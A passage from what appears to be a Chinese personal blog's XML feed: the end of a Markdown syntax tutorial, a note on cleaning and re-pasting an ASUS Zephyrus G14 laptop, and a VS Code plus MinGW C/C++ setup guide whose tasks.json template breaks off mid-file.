href="#3-段落" class="headerlink" title="3.段落"></a>3.段落</h2><p>段落没啥特殊的，一段话写完回车就行，想看着空一点就空一行再写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是一个段落</span><br><span class="line">这也是一个段落</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个段落</span><br><span class="line"></span><br><span class="line">这也是一个段落</span><br></pre></td></tr></table></figure><p>效果1：<br>这是一个段落<br>这也是一个段落</p><p>效果2：<br>这是一个段落</p><p>这也是一个段落</p><hr><h2 id="4-分割线"><a href="#4-分割线" class="headerlink" title="4.分割线"></a>4.分割线</h2><p>本文的分割线是因为主题关系所以显示为虚线</p><p><code>*</code>和<code>-</code>的组合，多少好像问题不大，但是三个最基本的需求就够了</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line">---</span><br><span class="line">* * *</span><br><span class="line">- - -</span><br><span class="line">-----------</span><br></pre></td></tr></table></figure><p>效果如下：</p><hr><hr><hr><hr><hr><p>over！</p><hr><h2 id="5-删除线"><a href="#5-删除线" class="headerlink" title="5.删除线"></a>5.删除线</h2><p>删除线跟加粗类似，使用两组<code>~~</code>组合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>效果如下：<br><del>删除线</del></p><hr><h2 id="6-引用"><a href="#6-引用" class="headerlink" title="6.引用"></a>6.引用</h2><p>引用使用<code>&gt;</code>表示，可以嵌套，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;1</span><br><span class="line">&gt;&gt;2</span><br><span class="line">&gt;&gt;&gt;3</span><br><span class="line">&gt;&gt;&gt;&gt;4</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>1</p><blockquote><p>2</p><blockquote><p>3</p><blockquote><p>4</p></blockquote></blockquote></blockquote></blockquote><h2 id="7-脚注"><a href="#7-脚注" class="headerlink" title="7.脚注"></a>7.脚注</h2><p>脚注用的相对少一点，就相当于对一个词拎出来单独描述，注解的说法。</p><p>例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">他说[^秋天]到了。</span><br><span class="line">[^秋天]:四季之一，进入秋季，意味着降雨、湿度等趋于下降或减少，在自然界中万物开始从繁茂成长趋向萧索成熟。</span><br></pre></td></tr></table></figure><p>效果如图：</p><img src="/2022/03/27/Markdown/000.png" class=""><p>不知道是主题修改了什么，在这个主题下没法显示，但是markdown预览是能看到的</p><hr><h2 id="8-列表"><a href="#8-列表" class="headerlink" title="8.列表"></a>8.列表</h2><p>列表分为有序和无序<br>无序可以使用<code>*</code>，<code>+</code>，<code>-</code>三种符号作为标记</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* 1</span><br><span class="line">* 2</span><br><span class="line">* 3</span><br><span class="line"></span><br><span class="line">+ 1</span><br><span class="line">+ 2</span><br><span class="line">+ 3</span><br><span class="line"></span><br><span class="line">- 1</span><br><span class="line">- 2</span><br><span class="line">- 3</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>1</li><li>2</li><li>3</li></ul><ul><li>1</li><li>2</li><li>3</li></ul><ul><li>1</li><li>2</li><li>3</li></ul><p>而有序列表则通过特定的开头+上<code>.</code>并空一格实现</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 1</span><br><span class="line">2. 2</span><br><span class="line">3. 3</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li>1</li><li>2</li><li>3</li></ol><p>嵌套列表自然是有序和无序的结合，或者是有序之间的叠加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. a</span><br><span class="line">    * aa</span><br><span class="line">2. b</span><br><span class="line">    * bb</span><br><span class="line">3. c</span><br><span class="line">    * cc</span><br><span class="line"></span><br><span class="line">1. a</span><br><span class="line">    1. aa</span><br><span class="line">2. b</span><br><span class="line">    2. bb</span><br><span class="line">3. c</span><br><span class="line">    3. cc</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li>a<ul><li>aa</li></ul></li><li>b<ul><li>bb</li></ul></li><li>c<ul><li>cc</li></ul></li></ol><p>!</p><ol><li>a<ol><li>aa</li></ol></li><li>b<ol start="2"><li>bb</li></ol></li><li>c<ol start="3"><li>cc</li></ol></li></ol><blockquote><p>这里可以看到有序之间的嵌套会使得里面的产生变化</p></blockquote><hr><h2 id="9-代码"><a href="#9-代码" class="headerlink" title="9.代码"></a>9.代码</h2><p>这个我感觉比较适合突出一个东西，类似加粗的效果，加粗是给文本变得厚重，代码函数或者片段更适合用修改背景色来突出。</p><p>此处使用两个反引号`</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`hh`</span><br></pre></td></tr></table></figure><p>效果如下：<br><code>hh</code></p><h2 id="10-链接"><a href="#10-链接" class="headerlink" title="10.链接"></a>10.链接</h2><p>图片和超链接的用法都差不多:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[这是一个指向百度的超链接](www.baidu.com)</span><br><span class="line">虽然有的地方好像在图片用法的前面加了一个!</span><br><span class="line">![这是一张图片](链接使用绝对路径还是相对路径取决于你自己)</span><br></pre></td></tr></table></figure><p>但是总体来讲区别不大，效果如下：<br><a href="www.baidu.com">这是一个指向百度的超链接</a><br><img src="/./source/../../images/logo.jpg" alt="这是一张图片"></p><hr><h2 id="11-表格"><a href="#11-表格" class="headerlink" title="11.表格"></a>11.表格</h2><p>markdown的表格由<code>|</code>来分隔单元格，由<code>-</code>分隔表头和其他行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|  表头   | 表头  |</span><br><span class="line">|  ----  | ----  |</span><br><span class="line">| 单元格  | 单元格 |</span><br><span class="line">| 单元格  | 单元格 |</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table><p>此外还有表格内文本对齐方式设置：<br>* -: 设置内容和标题栏居右对齐。<br>* :- 设置内容和标题栏居左对齐。<br>* :-: 设置内容和标题栏居中对齐。</p><p>效果如下：</p><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中对齐</th></tr></thead><tbody><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr></tbody></table><blockquote><p>但是相对而言，markdown的表格功能单一，就连合并单元格都没法操作，如果有此类需要，我们可以植入html代码</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>markdown的语法其实可以和html混用，但是根据不同浏览器和他的内核版本上，显示的效果可能存在差异，所以尽量少用</p>]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拆机吧</title>
      <link href="/2022/03/25/notebook/"/>
      <url>/2022/03/25/notebook/</url>
      
        <content type="html"><![CDATA[<h1 id="幻14清灰换硅脂"><a href="#幻14清灰换硅脂" class="headerlink" title="幻14清灰换硅脂"></a>幻14清灰换硅脂</h1><span id="more"></span><hr><h1 id="没啥流程"><a href="#没啥流程" class="headerlink" title="没啥流程"></a>没啥流程</h1><img src="/2022/03/25/notebook/000.jpg" class=""><p>准备个螺丝刀，拧开d面全部螺丝<br><strong>d壳右下角是固定在壳上的，拧到一定程度顶起来就行了，不用强行弄出来</strong></p><img src="/2022/03/25/notebook/001.jpg" class=""><p>放好，丢了麻烦</p><img src="/2022/03/25/notebook/002.jpg" class=""><p>积灰~懂得都懂</p><img src="/2022/03/25/notebook/003.jpg" class=""><p>注意，幻14主板有缺陷，尽量先拔掉电池排线，同时注意金属扣不要生碰到主板。。贴吧见过直接静电毙了的。</p><img src="/2022/03/25/notebook/004.jpg" class=""><p>同时，风扇也有两个电源排线连在主板，找个塑料棒挑开，别太用力，线断了麻烦。这边只举例左边。</p><hr><p>拖到暑假。。。因为滑丝了，滑丝工具在家。厚礼谢特</p><p>不要问，问就是工具还涨价，就用一次sei还多买一套。。。</p><img src="/2022/03/25/notebook/005.jpg" class=""><p>拧开散热模组和主板连接的所有螺丝之后，看到cpu和gpu是有点干巴。<br>额，这次换的是相变片，凑合用吧。<br>amd发热量也不小，加上都夏天了，小钢炮的风扇声太搞了。</p><blockquote><p>原本还想擦掉电容和内存颗粒上的硅脂，但是相变片买的不大不小，大是能盖住cpu和gpu，小就是罩不住其他地方了。。。</p></blockquote><p>给风扇吹吹装回去就凑合了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NoteBook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vscode c/c++ run+debug</title>
      <link href="/2022/03/23/vscode-c-c-configure/"/>
      <url>/2022/03/23/vscode-c-c-configure/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在大型项目开发面前，有clion，visual studio 20xx系列的产品存在，但是相对于基础学习，这些大型开发环境的占用和安装流程可能会稍微麻烦点。</p><span id="more"></span><p>在大学常规学习C语言时，我们常用的软件有：</p><ol><li><p>dev c++</p></li><li><p>visual c++ 6.0</p></li><li><p>code:blocks</p></li><li><p>c-free</p></li></ol><p>等常规软件，他们界面相对简单体积小，能满足基本学习要求。故相对而言，这些软件大部分都没什么更新了所以更固定。</p><blockquote><p>如果对对其他不做要求且需要高版本的gcc，那么你可以下载更高版本，去修改编译器使用的gcc即可。</p></blockquote><p>但是如果你和作者一样也喜欢折腾，也对编辑器的外观有一定的追求，那么本文或许能够帮到你。</p><blockquote><p>注意！配置可能稍显麻烦，不喜欢折腾的千万别勉强</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><blockquote><p>正文须知:很多软件的发布都是基于海外服务器，国内或有转载的，但是本文基于官网操作。懂科学之力的自然会得心应手。</p></blockquote><h2 id="0-本文所使用的环境"><a href="#0-本文所使用的环境" class="headerlink" title="0.本文所使用的环境"></a>0.本文所使用的环境</h2><ol><li>windows 11</li><li>vscode 1.65.2</li><li>gcc 9.2</li></ol><h2 id="1-vsocde"><a href="#1-vsocde" class="headerlink" title="1.vsocde"></a>1.vsocde</h2><p>首先我们需要进入官网下载一个vsocode，<a href="https://code.visualstudio.com/">戳此处</a>，这里稍微注意下微软在国内的下载速度有点慢，有能力的朋友可以使用科学之力。</p><img src="/2022/03/23/vscode-c-c-configure/000.png" class=""><p>下载完之后打开vscode，默认是英文环境，按图操作：</p><img src="/2022/03/23/vscode-c-c-configure/001.png" class="">点击安装，完成后右下角会提示重启软件以应用设置。<h2 id="2-mingw"><a href="#2-mingw" class="headerlink" title="2.mingw"></a>2.mingw</h2><h3 id="2-1-gcc安装"><a href="#2-1-gcc安装" class="headerlink" title="2.1 gcc安装"></a>2.1 gcc安装</h3><p>然后我们需要下载gcc，因为code本身只作为一个编辑器，编译以及debug的功能还是需要依赖gcc。<a href="https://sourceforge.net/projects/mingw/">戳此处跳转mingw</a>，还是老话这玩意下的比较慢。</p><img src="/2022/03/23/vscode-c-c-configure/003.png" class=""><p>下载完成后打开.exe程序</p><img src="/2022/03/23/vscode-c-c-configure/004.png" class=""><p>点击install，会进入到</p><img src="/2022/03/23/vscode-c-c-configure/005.png" class=""><p>在此处你可以修改下载的路径，全部下载大概需要五百多兆的内存，老电脑如果c盘不够大建议放置其他盘，新电脑则问题不大，看到<img src="/2022/03/23/vscode-c-c-configure/006.png" class="">后等待下载完点击continue</p><img src="/2022/03/23/vscode-c-c-configure/007.png" class="">,然后轮到我们选择需要安装的组件了:<img src="/2022/03/23/vscode-c-c-configure/008.png" class="">,之前百度的其实也不明不白的，所以直接快刀斩乱麻，全都下载，每行右击选择mark for installation之后点击左上角<img src="/2022/03/23/vscode-c-c-configure/009.png" class=""><p>静候安装，完成后找到你所安装的文件夹目录，进入bin目录，往下滑能看到gcc、g++、gdb则表示基本无误</p><img src="/2022/03/23/vscode-c-c-configure/010.png" class=""><h3 id="2-2-添加到path"><a href="#2-2-添加到path" class="headerlink" title="2.2 添加到path"></a>2.2 添加到path</h3><blockquote><p>右击此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/011.png" class=""><blockquote><p>然后找到系统变量里的path打开</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/012.png" class=""><blockquote><p>点击新建，将你mingw安装目录copy进来，记住要带上bin，如图所示</p></blockquote><img src="/2022/03/23/vscode-c-c-configure/013.png" class=""><p>完成后我们打开cmd或powershell进行验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br><span class="line">g++ -v</span><br></pre></td></tr></table></figure><img src="/2022/03/23/vscode-c-c-configure/014.png" class=""><p>得到如图提示即可</p><blockquote><p>可以的话先重启下电脑，以免vsocde抽风没识别到gcc已经添加到系统环境变量中了。</p></blockquote><p><strong>当然尝鲜的话你可以使用dev c++的gcc使用，只存在版本的差异而已。路径应该是你所安装的盘符&#x2F;dev c++&#x2F;bin目录下。但同时也要注意是否添加入变量环境中！</strong></p><h3 id="2-3-hello-world"><a href="#2-3-hello-world" class="headerlink" title="2.3 hello world"></a>2.3 hello world</h3><p>同样的我们在拓展商店中先下载一个基础从c&#x2F;c++拓展</p><img src="/2022/03/23/vscode-c-c-configure/002.png" class=""><p>建议先创建一个文件夹用来专门存放.c文件</p><img src="/2022/03/23/vscode-c-c-configure/015.png" class=""><p>我们新建一个hello.c文件<img src="/2022/03/23/vscode-c-c-configure/016.png" class=""></p><p>编写第一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f5或者点击运行-&gt;启动调试会弹出一个选择配置</p><img src="/2022/03/23/vscode-c-c-configure/017.png" class=""><p>这里我们直接选择第一个gdb即可，以前用过第二个，但是配置不够完整…..导致程序只能编译运行不能debug，所以也很苦恼，最后将两者结合了一下就差不多行了。</p><img src="/2022/03/23/vscode-c-c-configure/018.png" class=""><p>我们选择gcc.exe之后，我们会发现文件夹下多了一个.vscode，里面有两个文件分别是launch.json和tasks.json。并且都是存在内容的，但是你会发现程序并没有运行，所以直接套用我这里的模板。</p><blockquote><p>需要注意几点就是我的mingw路径是在d盘的，我会在launch.json和tasks.json中指出，希望你能仔细阅读</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//launch.json</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gcc.exe - 生成和调试活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\Windows\\system32\\cmd.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/C&quot;</span><span class="punctuation">,</span><span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span><span class="string">&quot;&amp;&quot;</span><span class="punctuation">,</span><span class="string">&quot;pause&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span><span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span>    <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;将反汇编风格设置为 Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//tasks.json</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: gcc.exe 生成活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin\\gcc.exe&quot;</span><span class="punctuation">,</span>   <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fdiagnostics-color=always&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\MinGW\\bin&quot;</span> <span class="comment">//这里需要修改</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                